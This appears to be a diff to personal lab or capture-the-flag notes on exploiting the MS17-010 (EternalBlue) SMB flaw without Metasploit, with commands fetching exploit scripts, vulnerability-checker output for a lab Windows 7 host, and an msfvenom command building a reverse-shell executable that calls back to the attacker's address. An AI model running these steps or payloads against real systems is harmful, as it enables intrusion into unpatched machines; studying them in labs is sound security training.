@@ -262,3 +262,64 @@ curl https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py > eterna
 curl https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py > eternalblue/checker.py
 ```
 
+
+# Without metasploit
+
+trying
+https://www.youtube.com/watch?v=rKLRMdmOd5A
+
+fix
+https://github.com/helviojunior/MS17-010/pull/3/files
+
+https://github.com/helviojunior/MS17-010
+
+`https://github.com/helviojunior/MS17-010/pull/1/commits/af7c3e62e177138964ebc6f6cb5146fdf0374265`
+
+```
+python3 checker.py 10.129.232.51
+Trying to connect to 10.129.232.51:445
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+=== Testing named pipes ===
+browser: STATUS_ACCESS_DENIED
+spoolss: STATUS_ACCESS_DENIED
+netlogon: STATUS_ACCESS_DENIED
+lsarpc: STATUS_ACCESS_DENIED
+samr: STATUS_ACCESS_DENIED
+```
+
+
+### user "" -> "guest"
+```
+python3 checker.py 10.129.232.51
+Trying to connect to 10.129.232.51:445
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+=== Testing named pipes ===
+browser: Ok (64 bit)
+spoolss: STATUS_OBJECT_NAME_NOT_FOUND
+netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
+lsarpc: Ok (64 bit)
+samr: Ok (64 bit)
+                            
+```
+
+### create payload
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe
+
+```
+
+### fix send_and_execute.py
+print needs parenthesis
+
+username "" -> "guest"
+
